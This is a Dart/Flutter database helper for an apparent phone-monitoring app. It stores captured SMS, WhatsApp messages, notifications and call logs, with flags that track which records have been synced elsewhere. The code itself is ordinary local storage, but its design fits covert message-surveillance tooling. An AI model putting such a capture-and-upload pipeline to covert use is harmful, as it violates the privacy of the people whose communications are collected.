import 'dart:async';
import 'package:path/path.dart';
import 'package:sqflite/sqflite.dart';

class DatabaseHelper {
  static final DatabaseHelper _instance = DatabaseHelper._internal();
  static Database? _database;

  factory DatabaseHelper() => _instance;

  DatabaseHelper._internal();

  Future<Database> get database async {
    if (_database != null) return _database!;
    _database = await _initDb();
    return _database!;
  }

  Future<Database> _initDb() async {
    String path = join(await getDatabasesPath(), 'monitoring_data.db');
    return await openDatabase(
      path,
      version: 1,
      onCreate: _onCreate,
    );
  }

  Future _onCreate(Database db, int version) async {
    // Table for SMS and Notifications
    await db.execute('''
      CREATE TABLE logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        type TEXT, -- 'SMS', 'WHATSAPP', 'NOTIFICATION'
        sender TEXT,
        content TEXT,
        timestamp TEXT,
        package_name TEXT,
        is_synced INTEGER DEFAULT 0
      )
    ''');

    // Table for Call Logs
    await db.execute('''
      CREATE TABLE calls (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        number TEXT,
        type TEXT, -- 'INCOMING', 'OUTGOING', 'MISSED'
        duration TEXT,
        timestamp TEXT,
        is_synced INTEGER DEFAULT 0
      )
    ''');
  }

  Future<int> insertLog(Map<String, dynamic> row) async {
    Database db = await database;
    return await db.insert('logs', row);
  }

  Future<int> insertCall(Map<String, dynamic> row) async {
    Database db = await database;
    return await db.insert('calls', row);
  }

  Future<List<Map<String, dynamic>>> getUnsyncedLogs() async {
    Database db = await database;
    return await db.query('logs', where: 'is_synced = ?', whereArgs: [0]);
  }

  Future<int> markLogSynced(int id) async {
    Database db = await database;
    return await db.update('logs', {'is_synced': 1}, where: 'id = ?', whereArgs: [id]);
  }
}
